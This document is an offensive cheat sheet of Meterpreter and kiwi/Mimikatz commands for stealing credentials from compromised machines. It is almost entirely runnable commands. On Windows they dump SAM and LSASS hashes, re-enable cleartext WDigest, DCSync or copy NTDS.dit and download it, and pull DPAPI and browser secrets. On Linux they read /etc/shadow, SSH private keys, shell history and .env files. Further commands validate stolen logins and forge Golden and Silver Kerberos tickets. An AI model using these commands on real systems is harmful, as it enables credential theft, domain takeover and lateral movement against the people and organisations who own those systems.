# Credential Harvesting Techniques via Meterpreter

## Windows Credential Locations

### SAM Database (Local Accounts)
```
# Requires SYSTEM privileges
hashdump
# Output: user:rid:lm_hash:ntlm_hash:::

# Alternative — more reliable on newer Windows
run post/windows/gather/hashdump
run post/windows/gather/smart_hashdump
```

### LSASS Memory (Logged-on Users)
```
load kiwi
creds_all

# Individual methods:
creds_msv        # NTLM hashes from memory
creds_wdigest    # Cleartext (if WDigest enabled — default on Win7/2008R2)
creds_kerberos   # Kerberos tickets from memory
creds_ssp        # SSP creds
creds_tspkg      # Terminal Services creds

# Enable WDigest on newer Windows (requires reboot or new logon):
reg setval -k 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -v UseLogonCredential -t REG_DWORD -d 1
```

### LSA Secrets (Service Passwords, VPN Creds)
```
run post/windows/gather/lsa_secrets
# Also via kiwi:
kiwi_cmd lsadump::secrets
```

### Cached Domain Credentials
```
run post/windows/gather/cachedump
# Offline cracking: hashcat -m 2100 cached_hashes.txt wordlist.txt
```

### NTDS.dit (Domain Controller)
```
# Via kiwi DCSync (no file copy needed — over DRSUAPI):
kiwi_cmd "lsadump::dcsync /domain:<DOMAIN> /user:krbtgt"
kiwi_cmd "lsadump::dcsync /domain:<DOMAIN> /all /csv"

# Via ntdsutil (disk-based):
shell
ntdsutil "activate instance ntds" "ifm" "create full C:\Temp\ntds" quit quit
exit
download C:\\Temp\\ntds\\Active\ Directory\\ntds.dit /tmp/ntds.dit
download C:\\Temp\\ntds\\registry\\SYSTEM /tmp/SYSTEM
# Offline: impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

### DPAPI Decryption
```
kiwi_cmd sekurlsa::dpapi
kiwi_cmd vault::cred
kiwi_cmd vault::list

# Browser credentials via DPAPI
run post/windows/gather/enum_chrome_credentials
run post/multi/gather/firefox_creds
run post/windows/gather/enum_ie_credentials
```

## Linux Credential Locations

### Shadow File
```
run post/linux/gather/hashdump
# Or manual:
cat /etc/shadow
# Offline: john --wordlist=wordlist.txt shadow_hashes.txt
```

### SSH Keys
```
run post/multi/gather/ssh_creds
# Manual:
cat /root/.ssh/id_rsa
cat /home/*/.ssh/id_rsa
find / -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" 2>/dev/null
```

### History & Config Files
```
run post/linux/gather/enum_users_history
# Manual:
cat /root/.bash_history
cat /home/*/.bash_history
grep -r "password" /etc/ /opt/ /var/www/ 2>/dev/null | head -50
find / -name "*.conf" -exec grep -l "password" {} \; 2>/dev/null
find / -name ".env" -exec cat {} \; 2>/dev/null
```

### Memory Scraping
```
# Dump process memory for credentials
run post/linux/gather/pptd_creds          # PAM credentials
run post/linux/gather/phpmyadmin_credsteal # phpMyAdmin
```

## Credential Validation
```
# Validate Windows creds via SMB
use auxiliary/scanner/smb/smb_login
set RHOSTS <TARGET>
set SMBUser <USER>
set SMBPass <PASS_OR_HASH>
run

# Validate SSH creds
use auxiliary/scanner/ssh/ssh_login
set RHOSTS <TARGET>
set USERNAME <USER>
set PASSWORD <PASS>
run

# Validate WinRM creds
use auxiliary/scanner/winrm/winrm_login
set RHOSTS <TARGET>
set USERNAME <USER>
set PASSWORD <PASS>
run
```

## Kerberos Ticket Attacks
```
# Kerberoasting via kiwi
kiwi_cmd "kerberos::list /export"

# Golden Ticket (requires krbtgt hash)
kiwi_cmd "kerberos::golden /user:fakeadmin /domain:<DOMAIN> /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /ptt"

# Silver Ticket (service-specific)
kiwi_cmd "kerberos::golden /user:fakeadmin /domain:<DOMAIN> /sid:<DOMAIN_SID> /target:<TARGET_FQDN> /service:cifs /rc4:<SERVICE_HASH> /ptt"

# Pass-the-Ticket
kiwi_cmd "kerberos::ptt <ticket.kirbi>"
```
